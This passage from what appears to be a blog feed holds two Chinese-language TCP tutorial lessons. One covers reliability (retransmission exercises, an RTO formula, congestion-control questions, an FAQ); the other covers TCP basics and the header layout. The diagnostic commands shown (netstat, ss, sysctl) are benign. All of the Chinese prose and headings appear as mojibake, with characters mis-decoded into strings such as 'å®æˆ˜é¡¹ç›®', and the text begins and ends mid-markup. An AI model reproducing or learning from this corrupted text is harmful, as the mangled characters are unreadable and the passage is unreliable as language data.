href="#8-å®æˆ˜é¡¹ç›®ï¼šTCPå¯é æ€§åˆ†æå·¥å…·" class="headerlink" title="8. å®æˆ˜é¡¹ç›®ï¼šTCPå¯é æ€§åˆ†æå·¥å…·"></a>8. å®æˆ˜é¡¹ç›®ï¼šTCPå¯é æ€§åˆ†æå·¥å…·</h2><h3 id="8-1-é¡¹ç›®åŠŸèƒ½"><a href="#8-1-é¡¹ç›®åŠŸèƒ½" class="headerlink" title="8.1 é¡¹ç›®åŠŸèƒ½"></a>8.1 é¡¹ç›®åŠŸèƒ½</h3><p>å®ç°å·¥å…·åˆ†æï¼š</p><ol><li>TCPè¿æ¥çš„é‡ä¼ ç»Ÿè®¡</li><li>RTTå’ŒRTOç›‘æ§</li><li>çª—å£å¤§å°å˜åŒ–</li><li>æ‹¥å¡æ§åˆ¶çŠ¶æ€</li></ol><h3 id="8-2-å·¥å…·æ¼”ç¤º"><a href="#8-2-å·¥å…·æ¼”ç¤º" class="headerlink" title="8.2 å·¥å…·æ¼”ç¤º"></a>8.2 å·¥å…·æ¼”ç¤º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ç›‘æ§TCPé‡ä¼ </span><br>python day16_tcp_reliability.py --monitor-retrans<br><br><span class="hljs-comment"># åˆ†æRTT</span><br>python day16_tcp_reliability.py --analyze-rtt<br><br><span class="hljs-comment"># æ¨¡æ‹Ÿæ‹¥å¡æ§åˆ¶</span><br>python day16_tcp_reliability.py --simulate-congestion<br><br><span class="hljs-comment"># çª—å£å¤§å°åˆ†æ</span><br>python day16_tcp_reliability.py --window-analysis<br></code></pre></td></tr></table></figure><hr><h2 id="9-ä»Šæ—¥ç»ƒä¹ "><a href="#9-ä»Šæ—¥ç»ƒä¹ " class="headerlink" title="9. ä»Šæ—¥ç»ƒä¹ "></a>9. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼šè§‚å¯Ÿé‡ä¼ "><a href="#ç»ƒä¹ 1ï¼šè§‚å¯Ÿé‡ä¼ " class="headerlink" title="ç»ƒä¹ 1ï¼šè§‚å¯Ÿé‡ä¼ "></a>ç»ƒä¹ 1ï¼šè§‚å¯Ÿé‡ä¼ </h3><p>ä½¿ç”¨Wiresharkï¼š</p><ol><li>è®¿é—®ä¸€ä¸ªç½‘ç«™</li><li>ç­›é€‰ï¼š<code>tcp.analysis.retransmission</code></li><li>è§‚å¯Ÿé‡ä¼ çš„æ®µ</li><li>åˆ†æé‡ä¼ åŸå› ï¼ˆè¶…æ—¶&#x2F;å¿«é€Ÿé‡ä¼ ï¼‰</li></ol><h3 id="ç»ƒä¹ 2ï¼šè®¡ç®—RTO"><a href="#ç»ƒä¹ 2ï¼šè®¡ç®—RTO" class="headerlink" title="ç»ƒä¹ 2ï¼šè®¡ç®—RTO"></a>ç»ƒä¹ 2ï¼šè®¡ç®—RTO</h3><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs coq">ç»™å®šRTTæ ·æœ¬ï¼š<span class="hljs-number">100</span>ms, <span class="hljs-number">120</span>ms, <span class="hljs-number">90</span>ms, <span class="hljs-number">110</span>ms<br><br>è®¡ç®—ï¼š<br><span class="hljs-number">1.</span> SRTT (Smoothed RTT)<br><span class="hljs-number">2.</span> RTTVAR (RTT Variation)<br><span class="hljs-number">3.</span> RTO (Retransmission <span class="hljs-keyword">Timeout</span>)<br><br>ä½¿ç”¨å…¬å¼ï¼š<br>SRTT = (<span class="hljs-number">1</span>-Î±) Ã— SRTT + Î± Ã— RTT_sample<br>RTTVAR = (<span class="hljs-number">1</span>-Î²) Ã— RTTVAR + Î² Ã— |<span class="hljs-type">SRTT</span> - RTT_sample|<br><span class="hljs-type">RTO</span> = SRTT + <span class="hljs-number">4</span> Ã— RTTVAR<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 3ï¼šæ¨¡æ‹Ÿæ‹¥å¡æ§åˆ¶"><a href="#ç»ƒä¹ 3ï¼šæ¨¡æ‹Ÿæ‹¥å¡æ§åˆ¶" class="headerlink" title="ç»ƒä¹ 3ï¼šæ¨¡æ‹Ÿæ‹¥å¡æ§åˆ¶"></a>ç»ƒä¹ 3ï¼šæ¨¡æ‹Ÿæ‹¥å¡æ§åˆ¶</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åœºæ™¯ï¼š<br><span class="hljs-bullet">-</span> åˆå§‹cwnd = 1 MSS<br><span class="hljs-bullet">-</span> ssthresh = 16 MSS<br><span class="hljs-bullet">-</span> MSS = 1460 å­—èŠ‚<br><br>é—®é¢˜ï¼š<br><span class="hljs-bullet">1.</span> ç»è¿‡å¤šå°‘ä¸ªRTTï¼Œcwndè¾¾åˆ°16ï¼Ÿ<br><span class="hljs-bullet">2.</span> å¦‚æœåœ¨cwnd=20æ—¶å‘ç”Ÿè¶…æ—¶ï¼Œæ–°çš„cwndå’Œssthreshæ˜¯å¤šå°‘ï¼Ÿ<br><span class="hljs-bullet">3.</span> å¦‚æœåœ¨cwnd=20æ—¶æ”¶åˆ°3ä¸ªé‡å¤ACKï¼Œcwndå’Œssthreshæ˜¯å¤šå°‘ï¼Ÿ<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 4ï¼šæŸ¥çœ‹TCPç»Ÿè®¡"><a href="#ç»ƒä¹ 4ï¼šæŸ¥çœ‹TCPç»Ÿè®¡" class="headerlink" title="ç»ƒä¹ 4ï¼šæŸ¥çœ‹TCPç»Ÿè®¡"></a>ç»ƒä¹ 4ï¼šæŸ¥çœ‹TCPç»Ÿè®¡</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># LinuxæŸ¥çœ‹TCPç»Ÿè®¡</span><br>netstat -s | grep -i tcp<br>ss -ti  <span class="hljs-comment"># æŸ¥çœ‹TCPè¯¦ç»†ä¿¡æ¯</span><br><br><span class="hljs-comment"># æŸ¥çœ‹é‡ä¼ ç»Ÿè®¡</span><br>netstat -s | grep retrans<br><br><span class="hljs-comment"># æŸ¥çœ‹æ‹¥å¡æ§åˆ¶ç®—æ³•</span><br>sysctl net.ipv4.tcp_congestion_control<br></code></pre></td></tr></table></figure><hr><h2 id="10-å¸¸è§é—®é¢˜"><a href="#10-å¸¸è§é—®é¢˜" class="headerlink" title="10. å¸¸è§é—®é¢˜"></a>10. å¸¸è§é—®é¢˜</h2><p><strong>Q1ï¼šä¸ºä»€ä¹ˆæ˜¯3ä¸ªé‡å¤ACKè§¦å‘å¿«é€Ÿé‡ä¼ ï¼Œè€Œä¸æ˜¯2ä¸ªæˆ–4ä¸ªï¼Ÿ</strong></p><p>Aï¼šè¿™æ˜¯ç»éªŒå€¼çš„å¹³è¡¡ï¼š</p><ul><li>2ä¸ªï¼šå¯èƒ½è¯¯åˆ¤ï¼ˆä¹±åºåˆ°è¾¾ï¼‰</li><li>3ä¸ªï¼šè¾ƒå¯é åœ°åˆ¤æ–­ä¸¢åŒ…</li><li>4ä¸ªï¼šå¤ªä¿å®ˆï¼Œå½±å“æ•ˆç‡</li></ul><p><strong>Q2ï¼šTCPå¦‚ä½•åŒºåˆ†ç½‘ç»œæ‹¥å¡å’Œæ¥æ”¶æ–¹æ…¢ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>ç½‘ç»œæ‹¥å¡ï¼šè¶…æ—¶æˆ–3ä¸ªé‡å¤ACK</li><li>æ¥æ”¶æ–¹æ…¢ï¼šWindowå­—æ®µå˜å°</li><li>TCPä¼šç›¸åº”è°ƒæ•´å‘é€é€Ÿåº¦</li></ul><p><strong>Q3ï¼šä¸ºä»€ä¹ˆæ…¢å¯åŠ¨è¦æŒ‡æ•°å¢é•¿ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>å¿«é€Ÿæ¢æµ‹å¯ç”¨å¸¦å®½</li><li>é¿å…åˆæœŸè¿‡äºä¿å®ˆ</li><li>é‡åˆ°æ‹¥å¡æ—¶èƒ½å¿«é€Ÿååº”</li></ul><p><strong>Q4ï¼šé€‰æ‹©æ€§ç¡®è®¤ï¼ˆSACKï¼‰æ˜¯å¿…é¡»çš„å—ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>ä¸æ˜¯å¿…é¡»ï¼Œä½†å¼ºçƒˆæ¨è</li><li>æ²¡æœ‰SACKæ—¶æ•ˆç‡è¾ƒä½</li><li>ç°ä»£TCPå®ç°åŸºæœ¬éƒ½æ”¯æŒSACK</li></ul><hr><h2 id="11-æ€»ç»“"><a href="#11-æ€»ç»“" class="headerlink" title="11. æ€»ç»“"></a>11. æ€»ç»“</h2><p>ä»Šå¤©æˆ‘ä»¬æ·±å…¥å­¦ä¹ äº†ï¼š</p><h3 id="æ ¸å¿ƒçŸ¥è¯†ç‚¹"><a href="#æ ¸å¿ƒçŸ¥è¯†ç‚¹" class="headerlink" title="æ ¸å¿ƒçŸ¥è¯†ç‚¹"></a>æ ¸å¿ƒçŸ¥è¯†ç‚¹</h3><ol><li><p><strong>åºåˆ—å·å’Œç¡®è®¤å·</strong>ï¼š</p><ul><li>åºåˆ—å·æ ‡è¯†å­—èŠ‚ä½ç½®</li><li>ç¡®è®¤å·è¡¨ç¤ºæœŸæœ›æ¥æ”¶çš„ä¸‹ä¸€ä¸ªå­—èŠ‚</li><li>ç´¯ç§¯ç¡®è®¤æœºåˆ¶</li></ul></li><li><p><strong>æ»‘åŠ¨çª—å£</strong>ï¼š</p><ul><li>æé«˜ä¼ è¾“æ•ˆç‡</li><li>å‘é€çª—å£å’Œæ¥æ”¶çª—å£</li><li>çª—å£å¤§å° &#x3D; min(rwnd, cwnd)</li></ul></li><li><p><strong>è¶…æ—¶é‡ä¼ </strong>ï¼š</p><ul><li>RTOåŠ¨æ€è®¡ç®—ï¼ˆJacobsonç®—æ³•ï¼‰</li><li>Karnç®—æ³•è§£å†³é‡ä¼ æ­§ä¹‰</li><li>æŒ‡æ•°é€€é¿</li></ul></li><li><p><strong>å¿«é€Ÿé‡ä¼ å’Œå¿«é€Ÿæ¢å¤</strong>ï¼š</p><ul><li>3ä¸ªé‡å¤ACKè§¦å‘</li><li>ä¸ç­‰è¶…æ—¶ï¼Œç«‹å³é‡ä¼ </li><li>SACKæé«˜æ•ˆç‡</li></ul></li><li><p><strong>æµé‡æ§åˆ¶</strong>ï¼š</p><ul><li>é˜²æ­¢æ¥æ”¶æ–¹è¿‡è½½</li><li>é›¶çª—å£å¤„ç†</li><li>ç³Šæ¶‚çª—å£ç»¼åˆç—‡</li></ul></li><li><p><strong>æ‹¥å¡æ§åˆ¶</strong>ï¼š</p><ul><li>æ…¢å¯åŠ¨ï¼ˆæŒ‡æ•°å¢é•¿ï¼‰</li><li>æ‹¥å¡é¿å…ï¼ˆçº¿æ€§å¢é•¿ï¼‰</li><li>å¿«é€Ÿæ¢å¤</li><li>å¤šç§ç®—æ³•å˜ä½“</li></ul></li></ol><h3 id="é‡ç‚¹å›é¡¾"><a href="#é‡ç‚¹å›é¡¾" class="headerlink" title="é‡ç‚¹å›é¡¾"></a>é‡ç‚¹å›é¡¾</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TCPå¯é ä¼ è¾“ = åºåˆ—å· <span class="hljs-code">+ ç¡®è®¤ +</span> é‡ä¼  + çª—å£<br><br>æ•ˆç‡ä¼˜åŒ–ï¼š<br><span class="hljs-bullet">- </span>æ»‘åŠ¨çª—å£ï¼ˆæ‰¹é‡å‘é€ï¼‰<br><span class="hljs-bullet">- </span>å¿«é€Ÿé‡ä¼ ï¼ˆä¸ç­‰è¶…æ—¶ï¼‰<br><span class="hljs-bullet">- </span>SACKï¼ˆé€‰æ‹©æ€§ç¡®è®¤ï¼‰<br><br>ç½‘ç»œå‹å¥½ï¼š<br><span class="hljs-bullet">- </span>æµé‡æ§åˆ¶ï¼ˆä¿æŠ¤æ¥æ”¶æ–¹ï¼‰<br><span class="hljs-bullet">- </span>æ‹¥å¡æ§åˆ¶ï¼ˆä¿æŠ¤ç½‘ç»œï¼‰<br></code></pre></td></tr></table></figure><h3 id="æ˜å¤©é¢„å‘Š"><a href="#æ˜å¤©é¢„å‘Š" class="headerlink" title="æ˜å¤©é¢„å‘Š"></a>æ˜å¤©é¢„å‘Š</h3><p><strong>ç¬¬17å¤©ï¼šUDPåè®®è¯¦è§£</strong></p><p>å†…å®¹é¢„è§ˆï¼š</p><ul><li>UDPæŠ¥æ–‡æ ¼å¼</li><li>UDP vs TCPæ·±å…¥å¯¹æ¯”</li><li>UDPåº”ç”¨åœºæ™¯</li><li>UDPç¼–ç¨‹å®æˆ˜</li><li>åŸºäºUDPå®ç°å¯é ä¼ è¾“</li></ul><hr><p><strong>ç»§ç»­åŠ æ²¹ï¼</strong> ğŸš€</p><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†TCPå¦‚ä½•å®ç°å¯é ä¼ è¾“ï¼Œè¿™æ˜¯TCPæœ€æ ¸å¿ƒçš„åŠŸèƒ½ã€‚ç†è§£è¿™äº›æœºåˆ¶ä¸ä»…èƒ½å¸®åŠ©ä½ æ›´å¥½åœ°ä½¿ç”¨TCPï¼Œè¿˜èƒ½åœ¨é‡åˆ°ç½‘ç»œé—®é¢˜æ—¶å¿«é€Ÿå®šä½åŸå› ï¼</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>15å¤©ï¼šTCPåè®®åŸºç¡€</title>
    <link href="/2025/11/10/15%E5%A4%A9%EF%BC%9ATCP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/11/10/15%E5%A4%A9%EF%BC%9ATCP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬15å¤©ï¼šTCPåè®®åŸºç¡€"><a href="#ç¬¬15å¤©ï¼šTCPåè®®åŸºç¡€" class="headerlink" title="ç¬¬15å¤©ï¼šTCPåè®®åŸºç¡€"></a>ç¬¬15å¤©ï¼šTCPåè®®åŸºç¡€</h1><h2 id="ä»Šæ—¥ç›®æ ‡"><a href="#ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ä»Šæ—¥ç›®æ ‡"></a>ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£TCPåè®®çš„æ ¸å¿ƒç‰¹æ€§</li><li>æŒæ¡TCPæŠ¥æ–‡æ ¼å¼</li><li>æ·±å…¥ç†è§£TCPä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹</li><li>æ·±å…¥ç†è§£TCPå››æ¬¡æŒ¥æ‰‹è¿‡ç¨‹</li><li>æŒæ¡TCPçŠ¶æ€æœºè½¬æ¢</li><li>å®ç°TCPè¿æ¥åˆ†æå·¥å…·</li></ul><hr><h2 id="1-TCPåè®®æ¦‚è¿°"><a href="#1-TCPåè®®æ¦‚è¿°" class="headerlink" title="1. TCPåè®®æ¦‚è¿°"></a>1. TCPåè®®æ¦‚è¿°</h2><h3 id="1-1-ä»€ä¹ˆæ˜¯TCPï¼Ÿ"><a href="#1-1-ä»€ä¹ˆæ˜¯TCPï¼Ÿ" class="headerlink" title="1.1 ä»€ä¹ˆæ˜¯TCPï¼Ÿ"></a>1.1 ä»€ä¹ˆæ˜¯TCPï¼Ÿ</h3><p><strong>TCPï¼ˆTransmission Control Protocolï¼Œä¼ è¾“æ§åˆ¶åè®®ï¼‰</strong> æ˜¯äº’è”ç½‘åè®®å¥—ä»¶ä¸­æœ€é‡è¦çš„åè®®ä¹‹ä¸€ã€‚</p><p><strong>ç”Ÿæ´»ç±»æ¯”</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown">TCPå°±åƒæ‰“ç”µè¯ï¼š<br><span class="hljs-bullet">1.</span> æ‹¨å·ç­‰å¾…å¯¹æ–¹æ¥å¬ï¼ˆå»ºç«‹è¿æ¥ï¼‰<br><span class="hljs-bullet">2.</span> åŒæ–¹ç¡®è®¤èƒ½å¬æ¸…æ¥šï¼ˆä¸‰æ¬¡æ¡æ‰‹ï¼‰<br><span class="hljs-bullet">3.</span> å¼€å§‹å¯¹è¯ï¼ˆæ•°æ®ä¼ è¾“ï¼‰<br><span class="hljs-bullet">4.</span> è¯´&quot;å†è§&quot;æŒ‚æ–­ç”µè¯ï¼ˆå››æ¬¡æŒ¥æ‰‹ï¼‰<br><br>ç‰¹ç‚¹ï¼š<br>âœ… å¯é ï¼šè¯´çš„æ¯å¥è¯å¯¹æ–¹éƒ½èƒ½å¬åˆ°<br>âœ… æœ‰åºï¼šå¯¹è¯å†…å®¹æŒ‰é¡ºåºä¼ é€’<br>âœ… é¢å‘è¿æ¥ï¼šå¿…é¡»å…ˆå»ºç«‹è¿æ¥æ‰èƒ½é€šè¯<br></code></pre></td></tr></table></figure><h3 id="1-2-TCPçš„æ ¸å¿ƒç‰¹æ€§"><a href="#1-2-TCPçš„æ ¸å¿ƒç‰¹æ€§" class="headerlink" title="1.2 TCPçš„æ ¸å¿ƒç‰¹æ€§"></a>1.2 TCPçš„æ ¸å¿ƒç‰¹æ€§</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs markdown">TCP = å¯é çš„ã€é¢å‘è¿æ¥çš„ã€å­—èŠ‚æµåè®®<br><br><span class="hljs-bullet">1.</span> é¢å‘è¿æ¥ï¼ˆConnection-Orientedï¼‰<br>   â”œâ”€â”€ é€šä¿¡å‰å¿…é¡»å»ºç«‹è¿æ¥<br>   â”œâ”€â”€ é€šä¿¡åå¿…é¡»é‡Šæ”¾è¿æ¥<br>   â””â”€â”€ ç±»ä¼¼æ‰“ç”µè¯<br><br><span class="hljs-bullet">2.</span> å¯é ä¼ è¾“ï¼ˆReliableï¼‰<br>   â”œâ”€â”€ æ•°æ®ä¸ä¸¢å¤±<br>   â”œâ”€â”€ æ•°æ®ä¸é‡å¤<br>   â”œâ”€â”€ æ•°æ®æŒ‰åºåˆ°è¾¾<br>   â””â”€â”€ é€šè¿‡ç¡®è®¤å’Œé‡ä¼ æœºåˆ¶å®ç°<br><br><span class="hljs-bullet">3.</span> å…¨åŒå·¥é€šä¿¡ï¼ˆFull-Duplexï¼‰<br>   â”œâ”€â”€ åŒæ–¹å¯åŒæ—¶å‘é€å’Œæ¥æ”¶<br>   â””â”€â”€ ç±»ä¼¼ç”µè¯å¯ä»¥åŒå‘å¯¹è¯<br><br><span class="hljs-bullet">4.</span> å­—èŠ‚æµæœåŠ¡ï¼ˆByte Streamï¼‰<br>   â”œâ”€â”€ é¢å‘å­—èŠ‚æµï¼Œä¸æ˜¯æ¶ˆæ¯æµ<br>   â”œâ”€â”€ åº”ç”¨å±‚äº¤ç»™TCPçš„æ•°æ®å¯èƒ½è¢«æ‹†åˆ†æˆ–åˆå¹¶<br>   â””â”€â”€ æ²¡æœ‰æ¶ˆæ¯è¾¹ç•Œ<br><br><span class="hljs-bullet">5.</span> æµé‡æ§åˆ¶ï¼ˆFlow Controlï¼‰<br>   â”œâ”€â”€ é˜²æ­¢å‘é€æ–¹å‘é€è¿‡å¿«<br>   â””â”€â”€ é€šè¿‡æ»‘åŠ¨çª—å£å®ç°<br><br><span class="hljs-bullet">6.</span> æ‹¥å¡æ§åˆ¶ï¼ˆCongestion Controlï¼‰<br>   â”œâ”€â”€ é˜²æ­¢ç½‘ç»œè¿‡è½½<br>   â””â”€â”€ æ…¢å¯åŠ¨ã€æ‹¥å¡é¿å…ç­‰ç®—æ³•<br></code></pre></td></tr></table></figure><h3 id="1-3-TCP-vs-UDP"><a href="#1-3-TCP-vs-UDP" class="headerlink" title="1.3 TCP vs UDP"></a>1.3 TCP vs UDP</h3><table><thead><tr><th>ç‰¹æ€§</th><th>TCP</th><th>UDP</th></tr></thead><tbody><tr><td><strong>è¿æ¥</strong></td><td>é¢å‘è¿æ¥</td><td>æ— è¿æ¥</td></tr><tr><td><strong>å¯é æ€§</strong></td><td>å¯é ï¼ˆç¡®è®¤+é‡ä¼ ï¼‰</td><td>ä¸å¯é ï¼ˆå°½åŠ›è€Œä¸ºï¼‰</td></tr><tr><td><strong>é¡ºåº</strong></td><td>ä¿è¯é¡ºåº</td><td>ä¸ä¿è¯é¡ºåº</td></tr><tr><td><strong>é€Ÿåº¦</strong></td><td>è¾ƒæ…¢ï¼ˆå¼€é”€å¤§ï¼‰</td><td>å¿«é€Ÿï¼ˆå¼€é”€å°ï¼‰</td></tr><tr><td><strong>å¤´éƒ¨å¼€é”€</strong></td><td>20-60å­—èŠ‚</td><td>8å­—èŠ‚</td></tr><tr><td><strong>æµé‡æ§åˆ¶</strong></td><td>æœ‰</td><td>æ— </td></tr><tr><td><strong>æ‹¥å¡æ§åˆ¶</strong></td><td>æœ‰</td><td>æ— </td></tr><tr><td><strong>æ•°æ®è¾¹ç•Œ</strong></td><td>å­—èŠ‚æµï¼ˆæ— è¾¹ç•Œï¼‰</td><td>æ•°æ®æŠ¥ï¼ˆæœ‰è¾¹ç•Œï¼‰</td></tr><tr><td><strong>åº”ç”¨åœºæ™¯</strong></td><td>HTTPã€FTPã€é‚®ä»¶</td><td>DNSã€è§†é¢‘ã€æ¸¸æˆ</td></tr></tbody></table><p><strong>ä½¿ç”¨åœºæ™¯å¯¹æ¯”</strong>ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs">é€‰æ‹©TCPï¼š<br>âœ… éœ€è¦å¯é ä¼ è¾“ï¼ˆæ–‡ä»¶ä¸‹è½½ã€ç½‘é¡µæµè§ˆï¼‰<br>âœ… æ•°æ®å®Œæ•´æ€§é‡è¦ï¼ˆé“¶è¡Œè½¬è´¦ã€é‚®ä»¶ï¼‰<br>âœ… é¡ºåºå¾ˆé‡è¦ï¼ˆèŠå¤©æ¶ˆæ¯ï¼‰<br><br>é€‰æ‹©UDPï¼š<br>âœ… å®æ—¶æ€§è¦æ±‚é«˜ï¼ˆè§†é¢‘é€šè¯ã€æ¸¸æˆï¼‰<br>âœ… å¯ä»¥å®¹å¿å°‘é‡ä¸¢åŒ…ï¼ˆç›´æ’­ã€è¯­éŸ³ï¼‰<br>âœ… æ•°æ®é‡å°ä¸”é¢‘ç¹ï¼ˆDNSæŸ¥è¯¢ï¼‰<br>âœ… å¹¿æ’­/ç»„æ’­é€šä¿¡<br></code></pre></td></tr></table></figure><hr><h2 id="2-TCPæŠ¥æ–‡æ ¼å¼"><a href="#2-TCPæŠ¥æ–‡æ ¼å¼" class="headerlink" title="2. TCPæŠ¥æ–‡æ ¼å¼"></a>2. TCPæŠ¥æ–‡æ ¼å¼</h2><h3 id="2-1-TCPæ®µç»“æ„"><a href="#2-1-TCPæ®µç»“æ„" class="headerlink" title="2.1 TCPæ®µç»“æ„"></a>2.1 TCPæ®µç»“æ„</h3><p>TCPä¼ è¾“çš„æ•°æ®å•å…ƒç§°ä¸º<strong>æ®µï¼ˆSegmentï¼‰</strong>ï¼š</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">TCPæ®µ </span>=<span class="hljs-string"> TCPå¤´éƒ¨ + æ•°æ®</span><br><span class="hljs-string"></span><br><span class="hljs-string">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="hljs-string">â”‚                    TCP å¤´éƒ¨                          â”‚</span><br><span class="hljs-string">â”‚                  (20-60 å­—èŠ‚)                        â”‚</span><br><span class="hljs-string">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span><br><span class="hljs-string">â”‚                    åº”ç”¨æ•°æ®                          â”‚</span><br><span class="hljs-string">â”‚                   (å¯å˜é•¿åº¦)                         â”‚</span><br><span class="hljs-string">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br></code></pre></td></tr></table></figure><h3 id="2-2-TCPå¤´éƒ¨æ ¼å¼ï¼ˆ20å­—èŠ‚æœ€å°ï¼‰"><a href="#2-2-TCPå¤´éƒ¨æ ¼å¼ï¼ˆ20å­—èŠ‚æœ€å°ï¼‰" class="headerlink" title="2.2 TCPå¤´éƒ¨æ ¼å¼ï¼ˆ20å­—èŠ‚æœ€å°ï¼‰"></a>2.2 TCPå¤´éƒ¨æ ¼å¼ï¼ˆ20å­—èŠ‚æœ€å°ï¼‰</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> 0                   1                   2                   3</span><br><span class="hljs-section"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|          æºç«¯å£ (16ä½)         |        ç›®æ ‡ç«¯å£ (16ä½)         |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                        åºåˆ—å· (32ä½)                           |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                      ç¡®è®¤å· (32ä½)                             |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|  å¤´éƒ¨  |       |C|E|U|A|P|R|S|F|                               |<br>|  é•¿åº¦  | ä¿ç•™  |W|C|R|C|S|S|Y|I|          çª—å£å¤§å° (16ä½)       |<br><span class="hljs-section">|  (4ä½) | (3ä½) |R|E|G|K|H|T|N|N|                     